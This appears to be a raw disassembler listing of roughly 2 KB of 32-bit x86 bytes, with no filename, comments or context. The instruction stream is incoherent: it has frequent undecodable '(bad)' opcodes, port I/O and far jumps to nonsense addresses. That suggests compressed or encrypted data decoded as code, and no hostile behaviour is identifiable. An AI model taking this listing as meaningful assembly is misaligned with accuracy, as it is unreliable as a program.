  4068e4:	pop    es
  4068e5:	cmc    
  4068e6:	add    esi,DWORD PTR ds:0x5538a5b1
  4068ec:	pop    es
  4068ed:	mov    edi,ebp
  4068ef:	jnp    0x4068c5
  4068f1:	out    dx,al
  4068f2:	add    bl,BYTE PTR [ecx]
  4068f4:	jb     0x406883
  4068f6:	(bad)  
  4068f7:	xchg   ebx,eax
  4068f8:	in     eax,dx
  4068f9:	(bad)  
  4068fa:	adc    cl,BYTE PTR [ecx]
  4068fc:	add    BYTE PTR [ecx+0xd],cl
  4068ff:	imul   edi,DWORD PTR ss:[ebx+0x26],0xffffffc0
  406904:	nop
  406905:	xchg   ecx,eax
  406906:	in     al,dx
  406907:	ror    DWORD PTR [eax-0x62a5465a],0xc5
  40690e:	jne    0x40698b
  406910:	pop    edi
  406911:	dec    edx
  406912:	test   BYTE PTR [ebx-0xfc012b1],0xea
  406919:	dec    ecx
  40691a:	div    BYTE PTR [esi+0x9]
  40691d:	push   0x5188e498
  406922:	mov    ebp,0x19e57d03
  406927:	ins    DWORD PTR es:[edi],dx
  406928:	add    DWORD PTR [esi+0x4c],eax
  40692b:	add    eax,0x19e7b3fd
  406930:	mov    ?,WORD PTR [ebx+ebx*2+0x6c]
  406934:	(bad)  
  406936:	and    al,0xcc
  406938:	fcom   DWORD PTR [eax-0x115753e3]
  40693e:	sub    ah,dl
  406940:	jae    0x4069bf
  406942:	and    eax,ebp
  406944:	mov    eax,ds:0x20ba84e8
  406949:	adc    BYTE PTR [ebx-0x1d],bh
  40694c:	mov    cl,0xeb
  40694e:	cmp    bl,BYTE PTR [eax+edi*2+0xa]
  406952:	pop    eax
  406953:	imul   edx,DWORD PTR [eax+0x45efc092],0xffffffde
  40695a:	ja     0x4068e0
  40695c:	mov    ds:0xe90197b1,al
  406961:	xor    al,0x3f
  406963:	pushf  
  406964:	jnp    0x40697f
  406966:	cdq    
  406967:	outs   dx,BYTE PTR ds:[esi]
  406968:	je     0x406926
  40696a:	fs cld 
  40696c:	dec    ebx
  40696d:	fsub   DWORD PTR [edx+ebp*8]
  406971:	enter  0xa144,0x72
  406975:	xchg   esp,eax
  406976:	jbe    0x4069cc
  406978:	sbb    BYTE PTR [ecx+0x2e],0x1d
  40697c:	mov    esi,0xd6b1733c
  406981:	inc    edi
  406982:	push   0xffffffb4
  406984:	sbb    DWORD PTR [eax],0xffffffdc
  406987:	inc    edi
  406988:	xor    bl,BYTE PTR [ecx+0x5355334b]
  40698e:	arpl   WORD PTR ds:0xf30e2f6e,si
  406994:	repz mov ebx,0xd38320b9
  40699a:	imul   edi,DWORD PTR [eax+0x654600ce]
  4069a1:	mov    cs,WORD PTR [ecx]
  4069a3:	lds    eax,FWORD PTR [ebp+ecx*1-0x6e]
  4069a7:	or     cl,BYTE PTR ds:0xf30d9cb0
  4069ad:	fldcw  WORD PTR [ebp-0x10]
  4069b0:	es ret 0xaabd
  4069b4:	sub    ecx,DWORD PTR [edi-0x2]
  4069b7:	jo     0x40698c
  4069b9:	mov    ecx,0x2cf6356
  4069be:	pop    es
  4069bf:	and    eax,0x23eab6bc
  4069c4:	xor    dl,BYTE PTR [ebp-0x65a6848a]
  4069ca:	call   0x8864:0xe30f969c
  4069d1:	aaa    
  4069d2:	cmp    al,0x50
  4069d4:	into   
  4069d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069d6:	dec    esp
  4069d7:	jmp    0x406a04
  4069d9:	mov    cl,0x85
  4069db:	or     al,0xd2
  4069dd:	loop   0x406997
  4069df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069e0:	push   0x11
  4069e2:	inc    edi
  4069e3:	jno    0x4069a6
  4069e5:	scas   al,BYTE PTR es:[edi]
  4069e6:	pop    edi
  4069e7:	aad    0xb1
  4069e9:	mov    ds:0xef160614,eax
  4069ee:	repnz xchg edx,eax
  4069f0:	scas   eax,DWORD PTR es:[edi]
  4069f1:	sbb    BYTE PTR [edi+0x10],dh
  4069f4:	sub    al,0xa7
  4069f6:	aad    0xdd
  4069f8:	cs jb  0x40699f
  4069fb:	mov    esi,DWORD PTR [eax-0x10]
  4069fe:	or     eax,0xaa9e8e06
  406a03:	add    DWORD PTR [edx-0x262e63bb],eax
  406a09:	inc    edx
  406a0a:	mov    esp,0x1465bf93
  406a0f:	pop    ebx
  406a10:	arpl   WORD PTR [eax+0x4ace4079],ax
  406a16:	loop   0x406a3e
  406a18:	iret   
  406a19:	call   0x867d:0x1bbb6243
  406a20:	xor    BYTE PTR [eax+0x51],bl
  406a23:	out    0x84,al
  406a25:	mov    eax,ds:0xd9ba2a8c
  406a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a2b:	icebp  
  406a2c:	out    dx,al
  406a2d:	push   eax
  406a2e:	sbb    BYTE PTR [ecx],dl
  406a30:	mov    DWORD PTR [esi+0x2a079075],edx
  406a36:	dec    esi
  406a37:	jl     0x406a94
  406a39:	and    DWORD PTR [esi],eax
  406a3b:	(bad)  
  406a3c:	jp     0x4069c8
  406a3e:	sub    al,0x2b
  406a40:	push   ss
  406a41:	push   ecx
  406a42:	lock jb 0x406aac
  406a45:	add    BYTE PTR [eax],0x59
  406a48:	or     bh,bh
  406a4a:	repnz adc edi,esp
  406a4d:	js     0x406a36
  406a4f:	test   DWORD PTR [ebx-0x24],ebp
  406a52:	stos   BYTE PTR es:[edi],al
  406a53:	mov    ebx,0x7ed8ce83
  406a58:	mov    bh,0x28
  406a5a:	jae    0x406aae
  406a5c:	mov    bh,0xb
  406a5e:	out    0xd9,al
  406a60:	jns    0x406a3c
  406a62:	jle    0x406a28
  406a64:	and    BYTE PTR [eax-0x7f],al
  406a67:	xchg   edx,eax
  406a68:	mov    al,ds:0xae111aa
  406a6d:	mov    eax,edi
  406a6f:	pop    ax
  406a71:	sub    edx,edx
  406a73:	pop    eax
  406a74:	shl    BYTE PTR [edx+ebx*1+0x6e2fe27e],cl
  406a7b:	in     eax,0x58
  406a7d:	xor    BYTE PTR [edi+0x6d91cdba],cl
  406a83:	fdivp  st(6),st
  406a85:	and    bh,BYTE PTR [esi]
  406a87:	or     dh,ah
  406a89:	mov    eax,ds:0x71f26b99
  406a8e:	xchg   esi,eax
  406a8f:	mov    ds:0x579519ce,eax
  406a94:	call   0xd95248a2
  406a99:	adc    ah,BYTE PTR [edi-0x5e]
  406a9c:	out    dx,al
  406a9d:	cmp    BYTE PTR [ebx+0x6431d91d],al
  406aa3:	popa   
  406aa4:	or     ebp,ecx
  406aa6:	add    eax,0x1c80b81a
  406aab:	rcr    DWORD PTR [esi-0x6d],cl
  406aae:	cmp    eax,0x21968fce
  406ab3:	mov    bh,BYTE PTR [edi+ebx*8]
  406ab6:	sbb    esi,DWORD PTR [edi-0x5e6e2623]
  406abc:	(bad)  
  406abd:	jge    0x406ab3
  406abf:	out    dx,eax
  406ac0:	adc    BYTE PTR [ebp+0x5e],ch
  406ac3:	add    al,0xdf
  406ac5:	jnp    0x406a7f
  406ac7:	mov    eax,ds:0xd3e3d80d
  406acc:	(bad)  
  406acd:	dec    esi
  406ace:	pop    ss
  406acf:	mov    edi,0x2573f469
  406ad4:	mov    al,ds:0xcf3f53d5
  406ad9:	clc    
  406ada:	lahf   
  406adb:	mov    edx,ecx
  406add:	mov    bh,0x3a
  406adf:	js     0x406abc
  406ae1:	adc    DWORD PTR [edi],ebx
  406ae3:	xor    eax,0xfacc2fa4
  406ae8:	xor    bl,bh
  406aea:	in     eax,dx
  406aeb:	mov    esp,0xd1d42a4a
  406af0:	add    DWORD PTR [ecx+0x79b9fabb],ecx
  406af6:	cld    
  406af7:	pop    ss
  406af8:	enter  0xb4b2,0xd5
  406afc:	sbb    al,0xd4
  406afe:	jnp    0x406b7d
  406b00:	das    
  406b01:	jo     0x406a84
  406b03:	es aas 
  406b05:	mov    edi,0x35951dc5
  406b0a:	jecxz  0x406ae1
  406b0c:	scas   eax,DWORD PTR es:[edi]
  406b0d:	cmp    edx,DWORD PTR ds:0x6f11a555
  406b13:	ins    BYTE PTR es:[edi],dx
  406b14:	add    edx,ecx
  406b16:	out    0x5,eax
  406b18:	cld    
  406b19:	mov    ebp,0x2141c349
  406b1e:	into   
  406b1f:	jne    0x406b95
  406b21:	ds (bad) 
  406b23:	(bad)  
  406b25:	xchg   esi,eax
  406b26:	ins    BYTE PTR es:[edi],dx
  406b27:	scas   eax,DWORD PTR es:[edi]
  406b28:	jge    0x406b84
  406b2a:	mov    edx,0xd7eb81b0
  406b2f:	mov    al,ds:0x21bad98
  406b34:	mov    esi,0xa3362b59
  406b39:	loopne 0x406af7
  406b3b:	lods   al,BYTE PTR ds:[esi]
  406b3c:	sub    eax,0x3ff9f267
  406b41:	adc    BYTE PTR [ecx],0x86
  406b44:	lods   al,BYTE PTR es:[esi]
  406b46:	mov    ah,0x76
  406b48:	push   ds
  406b49:	pusha  
  406b4a:	xchg   ecx,eax
  406b4b:	xor    esp,DWORD PTR [eax-0x13]
  406b4e:	cli    
  406b4f:	enter  0xa3fc,0x45
  406b53:	stos   DWORD PTR es:[edi],eax
  406b54:	mov    ch,0xfe
  406b56:	stos   DWORD PTR es:[edi],eax
  406b57:	popf   
  406b58:	adc    eax,0xc3d16f69
  406b5d:	jmp    0x406b51
  406b5f:	sbb    al,0x8d
  406b61:	inc    BYTE PTR [ebx-0x6c]
  406b64:	jo     0x406aed
  406b66:	mov    ebx,0x2625c428
  406b6b:	fstp   DWORD PTR [ebx-0x641f6275]
  406b71:	sub    dl,ch
  406b73:	in     eax,0x45
  406b75:	pop    edx
  406b76:	(bad)  [eax+ecx*1+0x50a02718]
  406b7d:	jl     0x406b60
  406b7f:	imul   edi,ebp,0x2b863b4b
  406b85:	cmp    eax,0xfa2c16b3
  406b8a:	lea    edi,[ebx]
  406b8c:	mov    ah,0x59
  406b8e:	retf   0x275c
  406b91:	into   
  406b92:	inc    esp
  406b93:	call   DWORD PTR [eax+eiz*1-0xa]
  406b97:	xchg   ecx,eax
  406b98:	dec    esp
  406b99:	hlt    
  406b9a:	inc    ebp
  406b9b:	cmp    eax,0x4f3a4bd0
  406ba0:	repz test DWORD PTR [ebp+0x29],0xf00d6e3f
  406ba8:	mov    ecx,0xe5cfbb47
  406bad:	nop
  406bae:	jno    0x406b3f
  406bb0:	stc    
  406bb1:	add    bl,BYTE PTR [edi+0x40320f5c]
  406bb7:	repz (bad) 
  406bba:	enter  0x536,0x6e
  406bbe:	mov    ebx,DWORD PTR [ebp+0x49]
  406bc1:	or     esp,eax
  406bc3:	andnps xmm2,XMMWORD PTR [ebp+eiz*2+0x7d6a47dd]
  406bcb:	pop    es
  406bcc:	cmc    
  406bcd:	ret    0xc5b3
  406bd0:	pop    ss
  406bd1:	inc    esp
  406bd2:	in     eax,0x8e
  406bd4:	hlt    
  406bd5:	aad    0xd6
  406bd7:	adc    al,BYTE PTR [ebp+0x42]
  406bda:	clc    
  406bdb:	dec    ecx
  406bdc:	push   edx
  406bdd:	pusha  
  406bde:	fmul   QWORD PTR [ecx]
  406be0:	(bad)  
  406be1:	push   0x13
  406be3:	adc    BYTE PTR [edi],ah
  406be5:	sub    BYTE PTR [ebx+0x7edc6f1a],cl
  406beb:	aas    
  406bec:	dec    ebp
  406bed:	out    dx,al
  406bee:	lods   eax,DWORD PTR ds:[esi]
  406bef:	jecxz  0x406ba4
  406bf1:	and    ah,0x4a
  406bf4:	dec    ebx
  406bf6:	lahf   
  406bf7:	repnz mov eax,0xfee36588
  406bfd:	pusha  
  406bfe:	in     al,dx
  406bff:	stc    
  406c00:	leave  
  406c01:	aas    
  406c02:	push   ebp
  406c03:	cli    
  406c04:	aas    
  406c05:	dec    ebx
  406c06:	not    dh
  406c08:	or     DWORD PTR ds:0xd613cc3,ebx
  406c0e:	xchg   ecx,eax
  406c0f:	or     eax,0x9584fcf9
  406c14:	pop    ebp
  406c15:	push   ebx
  406c16:	arpl   ax,bp
  406c18:	out    0x71,eax
  406c1a:	and    al,0xb3
  406c1c:	or     ah,bh
  406c1e:	dec    edx
  406c1f:	pop    ecx
  406c20:	jmp    0x912b:0x1cd9a605
  406c27:	add    al,0xd6
  406c29:	mov    gs,WORD PTR [edx]
  406c2b:	int3   
  406c2c:	xor    dh,cl
  406c2e:	sub    BYTE PTR [edi+edx*2-0xd6b33ea],0x60
  406c36:	xor    al,0x62
  406c38:	inc    edx
  406c39:	test   al,0x69
  406c3b:	xchg   esi,eax
  406c3c:	add    BYTE PTR [ebp-0x18],dl
  406c3f:	mov    ch,BYTE PTR [esp+ebp*1]
  406c42:	leave  
  406c43:	push   0xd
  406c45:	or     al,0xaa
  406c47:	fwait
  406c48:	inc    esi
  406c49:	jo     0x406cbe
  406c4b:	pop    es
  406c4c:	pop    edi
  406c4d:	xor    eax,0xfd217c5c
  406c52:	rol    ecx,0x70
  406c55:	addr16 aam 0xe1
  406c58:	xchg   edi,eax
  406c59:	adc    bh,cl
  406c5b:	cmc    
  406c5c:	enterw 0x6695,0x66
  406c61:	cmp    bl,BYTE PTR [eax+0x1e]
  406c64:	out    dx,eax
  406c65:	mov    ecx,0x972ccbe9
  406c6a:	sbb    BYTE PTR [esp+eiz*8-0x56f2e180],dl
  406c71:	in     eax,0xae
  406c73:	cdq    
  406c74:	aad    0x9e
  406c76:	stc    
  406c77:	jae    0x406c8d
  406c79:	adc    DWORD PTR [esi-0x3a8911cc],eax
  406c7f:	jp     0x406ca5
  406c81:	rcr    ah,0xcd
  406c84:	mov    ah,0x96
  406c86:	mov    ah,0xc3
  406c88:	pop    ds
  406c89:	xchg   ecx,eax
  406c8a:	out    0x38,al
  406c8c:	dec    esp
  406c8d:	and    ebx,DWORD PTR [ebx]
  406c8f:	and    esp,DWORD PTR [esi+0x12a43d02]
  406c95:	mov    ebp,0x8b711dd2
  406c9a:	les    esp,FWORD PTR [ebp-0x55]
  406c9d:	mov    eax,ds:0xeaecf5f2
  406ca2:	imul   ebp,ecx,0x50
  406ca5:	or     eax,0xeef3d731
  406caa:	shr    DWORD PTR [eax+0x67],0xf3
  406cae:	jl     0x406c4c
  406cb0:	fwait
  406cb1:	or     esi,DWORD PTR [ebp+0x54f073d6]
  406cb7:	repz jnp 0x406cb6
  406cba:	mov    dl,0xe4
  406cbc:	sar    BYTE PTR [eax+ecx*8-0x5e92b818],1
  406cc3:	mov    bl,0x2c
  406cc5:	push   ebx
  406cc6:	fcos   
  406cc8:	int    0x28
  406cca:	xchg   esi,eax
  406ccb:	xchg   edi,eax
  406ccc:	das    
  406ccd:	mov    ds:0xcf090b80,eax
  406cd2:	test   al,0x11
  406cd4:	add    DWORD PTR [eax+ebp*2],edi
  406cd7:	nop
  406cd8:	inc    ebp
  406cd9:	int    0x6a
  406cdb:	sbb    BYTE PTR [ecx-0x2e5d279],ah
  406ce1:	jmp    0x6c65d9e6
  406ce6:	jno    0x406cd3
  406ce8:	mov    ch,0xf3
  406cea:	mov    eax,ds:0xc29a956e
  406cef:	aam    0x5c
  406cf1:	test   al,0xd6
  406cf3:	sub    edx,esp
  406cf5:	fist   DWORD PTR [edi]
  406cf7:	pop    ebp
  406cf8:	lds    esp,FWORD PTR [edi]
  406cfa:	lock outs dx,DWORD PTR ds:[esi]
  406cfc:	add    DWORD PTR [ecx+edi*4],edx
  406cff:	inc    esp
  406d00:	cmp    ebx,DWORD PTR [edi]
  406d02:	fdivr  DWORD PTR ds:0xd9dbb86e
  406d08:	mov    DWORD PTR [edi+0x70c50dfd],ebx
  406d0e:	stos   BYTE PTR es:[edi],al
  406d0f:	fldcw  WORD PTR [esi-0x3a449fbc]
  406d15:	stc    
  406d16:	ror    DWORD PTR [ecx-0x3d],0x9a
  406d1a:	enter  0x1a4d,0x4
  406d1e:	stos   BYTE PTR es:[edi],al
  406d1f:	daa    
  406d20:	push   ecx
  406d21:	push   0x19
  406d23:	pop    ss
  406d24:	in     al,dx
  406d25:	mov    dh,0x97
  406d27:	stos   BYTE PTR es:[edi],al
  406d28:	pushf  
  406d29:	and    esi,DWORD PTR [ebx+esi*2-0x19]
  406d2d:	aad    0xe5
  406d2f:	jp     0x406cbd
  406d31:	mov    al,0x8
  406d33:	aas    
  406d34:	enter  0xab6f,0x86
  406d38:	jns    0x406dad
  406d3a:	daa    
  406d3b:	test   BYTE PTR [esi],bh
  406d3d:	ret    0x5630
  406d40:	ss (bad) 
  406d42:	cmc    
  406d43:	jmp    0xbe0b86fc
  406d48:	jmp    0x406da3
  406d4a:	xchg   bh,bl
  406d4c:	arpl   WORD PTR [edi-0x787a90f0],dx
  406d52:	inc    ecx
  406d53:	sub    BYTE PTR [ebp-0x11933ae],bl
  406d59:	aad    0x4f
  406d5b:	jo     0x406d01
  406d5d:	frstor [ebx]
  406d5f:	mov    ebp,0xc68612d6
  406d64:	and    eax,DWORD PTR [eax+0x3]
  406d67:	inc    esi
  406d68:	lds    ecx,FWORD PTR [edx+edi*8-0x57]
  406d6c:	sbb    dh,BYTE PTR ds:0x27031291
  406d72:	rcl    BYTE PTR [esi-0x15],1
  406d75:	fstp   DWORD PTR [edx+0x36ee3b8]
  406d7b:	inc    ebx
  406d7c:	pop    ds
  406d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d7e:	jns    0x406dbf
  406d80:	add    dh,ah
  406d82:	and    eax,0x7b2dc644
  406d87:	cmp    ebx,DWORD PTR [edx-0x1f6a837b]
  406d8d:	adc    DWORD PTR [edx+eax*4],esp
  406d90:	adc    al,0x3d
  406d92:	mov    fs,esi
  406d94:	shl    BYTE PTR [edi+0xa],0x90
  406d98:	std    
  406d99:	push   ecx
  406d9a:	xor    edi,esi
  406d9c:	or     BYTE PTR [esi],bl
  406d9e:	or     BYTE PTR [esi-0xb],ch
  406da1:	xor    DWORD PTR [ecx-0x6d9ca62a],edx
  406da7:	fimul  WORD PTR [edi-0x68532674]
  406dad:	jecxz  0x406dab
  406daf:	push   esp
  406db0:	fnsave [eax+0x178fd99a]
  406db6:	les    esi,FWORD PTR [eax+0x50]
  406db9:	jns    0x406ddb
  406dbb:	out    0xe5,al
  406dbd:	std    
  406dbe:	or     edx,esp
  406dc0:	hlt    
  406dc1:	shl    DWORD PTR [ecx+edi*2],0x1f
  406dc5:	jmp    DWORD PTR [esp+ecx*8-0x7898900c]
  406dcc:	cmp    BYTE PTR [edi],0x87
  406dcf:	fisub  DWORD PTR ds:0xd2b02cc0
  406dd6:	loopne 0x406e21
  406dd8:	pop    ebp
  406dd9:	pop    edx
  406dda:	(bad)  [edx]
  406ddc:	push   esi
  406ddd:	xor    ch,ah
  406ddf:	inc    ecx
  406de0:	(bad)  
  406de2:	(bad)  
  406de3:	fisttp QWORD PTR [edx]
  406de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406de6:	call   0x59fc638e
  406deb:	cmp    al,0xf1
  406ded:	shl    DWORD PTR [edi-0x3ce9f17],cl
  406df3:	or     edi,esi
  406df5:	pushf  
  406df6:	fisttp QWORD PTR [ebx+0x41105037]
  406dfc:	loop   0x406dd5
  406dfe:	mov    ecx,0x85c22259
  406e03:	fwait
  406e04:	cmp    ah,bh
  406e06:	push   eax
  406e07:	push   eax
  406e08:	retf   
  406e09:	je     0x406daf
  406e0b:	ret    
  406e0c:	xchg   edx,eax
  406e0d:	mov    bp,0xf60
  406e11:	call   0x7dc7:0xb0981784
  406e18:	js     0x406e39
  406e1a:	lods   al,BYTE PTR ds:[esi]
  406e1b:	lea    ebp,[ebx+0x604199e9]
  406e21:	push   edi
  406e22:	add    edi,DWORD PTR [esi+ecx*8]
  406e25:	mov    DWORD PTR [si-0x29],edx
  406e29:	fwait
  406e2a:	in     eax,dx
  406e2b:	shr    esi,0xf2
  406e2e:	fnsave [ecx+ebp*4]
  406e31:	inc    ebx
  406e32:	aas    
  406e33:	neg    DWORD PTR [esi+ebx*8+0x61]
  406e37:	mov    bh,0xa9
  406e39:	mov    ds:0x432d5cec,eax
  406e3e:	xchg   esi,eax
  406e3f:	cdq    
  406e40:	dec    edi
  406e41:	inc    esi
  406e42:	or     DWORD PTR cs:[ecx*4-0x76fac4dd],esp
  406e4a:	mov    BYTE PTR [ecx+esi*4],0x9c
  406e4e:	ret    0x9ee
  406e51:	dec    edi
  406e52:	psrlq  mm4,QWORD PTR [esi+edi*2+0x5aa09067]
  406e5a:	scas   al,BYTE PTR es:[edi]
  406e5b:	ret    0xb47c
  406e5e:	xor    BYTE PTR [eax+ecx*1+0x15],ch
  406e62:	std    
  406e63:	mov    edi,0x361ee22d
  406e68:	mov    eax,ds:0x326b6191
  406e6d:	test   al,0xd3
  406e6f:	mov    edi,0x1270c7d8
  406e74:	pop    esp
  406e75:	out    0x83,al
  406e77:	lods   al,BYTE PTR ds:[esi]
  406e78:	jp     0x406ec1
  406e7a:	pop    edi
  406e7b:	adc    eax,0x4a5f2bd7
  406e80:	or     DWORD PTR [edi],ebp
  406e82:	rol    BYTE PTR [edx*4+0x1eec31a9],cl
  406e89:	xor    ebp,ebp
  406e8b:	(bad)  
  406e8c:	es mov ch,0xec
  406e8f:	cdq    
  406e90:	dec    ecx
  406e91:	call   0x9c5dc470
  406e96:	pop    edx
  406e97:	xchg   edx,eax
  406e98:	popa   
  406e99:	mov    edi,0xf9fe2faa
  406e9e:	shl    BYTE PTR [edx+0x5a4e8c73],0x6e
  406ea5:	mov    esi,0x809c7942
  406eaa:	in     eax,dx
  406eab:	out    dx,eax
  406eac:	pushf  
  406ead:	pop    ebp
  406eae:	dec    edx
  406eaf:	and    edi,edx
  406eb1:	mov    edi,0x7677a4d2
  406eb6:	loop   0x406ea5
  406eb8:	les    edx,FWORD PTR [ecx]
  406eba:	rcr    BYTE PTR [eax+0x26b1d398],cl
  406ec0:	mov    ecx,0x1a385164
  406ec5:	out    0xdc,eax
  406ec7:	jno    0x406f13
  406ec9:	xchg   esi,eax
  406eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ecb:	jmp    0x5bf7:0x3e493612
  406ed2:	loope  0x406ead
  406ed4:	mov    esi,0xc45c2f4d
  406ed9:	xor    al,0x67
  406edb:	xor    eax,0xcceb00c6
  406ee0:	jle    0x406e7b
  406ee2:	ror    al,cl
  406ee4:	gs ss pop ebx
  406ee7:	mov    esp,0x97374414
  406eec:	and    esi,DWORD PTR [ecx]
  406eee:	inc    edi
  406eef:	leave  
  406ef0:	or     BYTE PTR [ebp-0x42a569d1],ch
  406ef6:	dec    eax
  406ef7:	push   ecx
  406ef8:	xor    dl,BYTE PTR [esi-0x13185623]
  406efe:	mov    ebx,0xf3d7bc2d
  406f03:	scas   al,BYTE PTR es:[edi]
  406f04:	mov    bh,0x1a
  406f06:	int3   
  406f07:	ror    DWORD PTR [edi-0x161de4a],0xce
  406f0e:	lds    esi,FWORD PTR [ebp-0x352de222]
  406f14:	fs push 0x2ef78861
  406f1a:	jae    0x406f6b
  406f1c:	and    ebx,DWORD PTR [eax-0x67]
  406f1f:	sbb    BYTE PTR [edi+0x36],cl
  406f22:	mov    al,0xd9
  406f24:	jo     0x406f2a
  406f26:	ins    BYTE PTR es:[edi],dx
  406f27:	xchg   ebx,eax
  406f28:	aas    
  406f29:	int3   
  406f2a:	dec    ecx
  406f2b:	and    ch,BYTE PTR [esi+eax*8+0x5b21b254]
  406f32:	dec    eax
  406f33:	push   edx
  406f34:	es pop ebp
  406f36:	test   al,0xf4
  406f38:	in     eax,dx
  406f39:	inc    edi
  406f3a:	push   ebx
  406f3b:	mov    ds:0xddcadc57,eax
  406f40:	mov    dl,0x8f
  406f42:	mov    cl,0x46
  406f44:	jae    0x406f84
  406f46:	dec    ebp
  406f47:	call   0x540a:0xa7964871
  406f4e:	sub    BYTE PTR [ecx-0x13],dh
  406f51:	aaa    
  406f52:	push   0x5
  406f54:	xchg   BYTE PTR [edi],al
  406f56:	add    eax,0x2eaf1713
  406f5b:	sbb    BYTE PTR [edx+0x73],cl
  406f5e:	jge    0x406f44
  406f60:	aam    0x5
  406f62:	fist   DWORD PTR [esi*4-0x4de804c5]
  406f69:	aam    0x32
  406f6b:	jp     0x406f8b
  406f6d:	add    al,0xd0
  406f6f:	iret   
  406f70:	mov    BYTE PTR [eax-0x19],bl
  406f73:	xor    dl,BYTE PTR [edx]
  406f75:	daa    
  406f76:	packssdw mm1,QWORD PTR [esi]
  406f79:	mov    ebp,0xb14b543
  406f7e:	mov    esi,0x95e3d8f1
  406f83:	repnz inc esi
  406f85:	mov    al,ds:0x693e02c1
  406f8a:	ret    0x4a36
  406f8d:	mov    ecx,0xabdfd960
  406f92:	(bad)  
  406f93:	and    esp,DWORD PTR [ebp-0x6beee5ab]
  406f99:	xchg   ebx,eax
  406f9a:	outs   dx,BYTE PTR ds:[esi]
  406f9b:	sub    DWORD PTR [esi+eiz*1+0x52787701],esp
  406fa2:	add    al,0x47
  406fa4:	add    DWORD PTR [eax+0x18d730ae],ecx
  406faa:	xor    BYTE PTR [ebx+ecx*2-0x59],cl
  406fae:	shl    bl,1
  406fb0:	sbb    DWORD PTR [ebx+0x3e],eax
  406fb3:	test   al,0x80
  406fb5:	xchg   ebp,eax
  406fb7:	test   DWORD PTR ds:0x946f8d47,ebx
  406fbd:	out    0xa5,eax
  406fbf:	mov    ebp,DWORD PTR [ebx+0x3d]
  406fc2:	and    eax,0xf996909
  406fc7:	add    edx,esp
  406fc9:	stos   BYTE PTR es:[edi],al
  406fca:	test   BYTE PTR [ecx+0x644b5b26],0xb1
  406fd1:	mov    dl,0x9f
  406fd3:	in     eax,dx
  406fd4:	dec    eax
  406fd5:	leave  
  406fd6:	xchg   esi,eax
  406fd7:	and    bl,BYTE PTR [ecx+0x71]
  406fda:	adc    eax,0x93d51b5f
  406fdf:	sub    al,BYTE PTR [ebp-0x400f30b4]
  406fe5:	or     edi,esi
  406fe7:	js     0x406fe3
  406fe9:	bound  eax,QWORD PTR [edi+0x7a]
  406fec:	call   0x1f760034
  406ff1:	fistp  DWORD PTR ds:0x6413fe73
  406ff7:	pop    ebx
  406ff8:	adc    BYTE PTR [ecx-0x70],dh
  406ffb:	add    esp,0x7
  406ffe:	cmp    DWORD PTR [ebx],0xffffffc3
  407001:	addr16 sbb al,0xa7
  407004:	jb     0x406fd3
  407006:	(bad)  
  407007:	mov    dl,0xca
  407009:	sbb    BYTE PTR [edi-0x65c2256],dh
  40700f:	inc    ebx
  407010:	icebp  
  407011:	xor    ecx,0xf52910d5
  407017:	out    dx,eax
  407018:	xchg   ebp,eax
  407019:	aas    
  40701a:	mov    ch,0x96
  40701c:	clc    
  40701d:	jmp    0xefc4:0xaf49dc6a
  407024:	xor    DWORD PTR [esi],ebx
  407026:	push   es
  407027:	mov    bl,0x14
  407029:	lods   eax,DWORD PTR ds:[esi]
  40702a:	ret    0xd527
  40702d:	adc    dh,BYTE PTR [esi+0x67]
  407030:	pop    esi
  407031:	adc    eax,0x5fa3c6de
  407036:	xchg   edx,eax
  407037:	push   ss
  407038:	out    0x6c,eax
  40703a:	sub    DWORD PTR [ecx],ecx
  40703c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40703d:	push   esi
  40703e:	push   0xffffffe3
  407040:	adc    eax,0x49b8d415
  407045:	fcmovnu st,st(7)
  407047:	sbb    al,0xae
  407049:	fwait
  40704a:	ret    0x68f8
  40704d:	repz lahf 
  40704f:	push   edx
  407050:	sub    eax,0x24597e4e
  407055:	xchg   ebx,eax
  407056:	in     eax,dx
  407057:	das    
  407058:	mov    cl,0x56
  40705a:	loopne 0x407096
  40705c:	in     eax,0x64
  40705e:	pop    ebx
  40705f:	aad    0x4a
  407061:	mov    dl,0xbf
  407063:	cmp    ebx,esi
  407065:	jge    0x407025
  407067:	inc    esi
  407068:	je     0x40708c
  40706a:	imul   ecx,ecx,0x4a
  40706d:	ja     0x4070c2
  40706f:	loope  0x407022
  407071:	enter  0xf1dd,0x5c
  407075:	inc    ebx
  407076:	call   0x1249:0x5c8db65d
  40707d:	jne    0x407060
  40707f:	inc    esi
  407080:	fwait
  407081:	dec    ebx
  407082:	jl     0x4070ef
  407084:	sbb    eax,0xbea445c6
  407089:	rol    BYTE PTR [ebx+0x550d073f],cl
  40708f:	(bad)  
  407090:	or     DWORD PTR [ebx+0x482b7431],eax
  407096:	dec    edx
  407097:	idiv   BYTE PTR [eax+0x4fd20674]
  40709d:	das    
  40709e:	jae    0x407099
  4070a0:	into   
  4070a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070a2:	shr    DWORD PTR [ecx+0x3f],1
  4070a5:	je     0x407056
  4070a7:	mov    al,0xcf
  4070a9:	shl    eax,0xa6
  4070ac:	sbb    eax,0x2e0dce65
  4070b1:	dec    ebp
  4070b2:	sahf   
  4070b3:	daa    
  4070b4:	mov    ecx,0x5da0b851
  4070b9:	and    eax,0xd1a1e96d
  4070be:	dec    edi
  4070bf:	sub    al,0x45
  4070c1:	mov    eax,0x7f621473
  4070c6:	mul    al
  4070c8:	and    bl,BYTE PTR [edi+0x582696b7]
  4070ce:	adc    al,0x54
  4070d0:	jbe    0x4070a6
  4070d2:	retf   0x6694
  4070d5:	add    ebp,DWORD PTR [edx+eax*1+0x75f45c19]
  4070dc:	sub    DWORD PTR [ecx-0x32bce08],0x87790af0
  4070e6:	into   
  4070e7:	pop    ebx
  4070e8:	out    dx,eax
  4070e9:	(bad)
  4070ec:	bound  ebp,QWORD PTR [ebp-0x61]
  4070ef:	jae    0x4070e2
  4070f1:	test   al,0x69
  4070f3:	dec    eax
  4070f4:	sub    eax,0x48ead5aa
  4070f9:	adc    al,0x2a
  4070fb:	shr    ebx,1
  4070fd:	xchg   BYTE PTR [eax-0x179b11e4],ah
  407103:	mov    esi,0x8f11897c
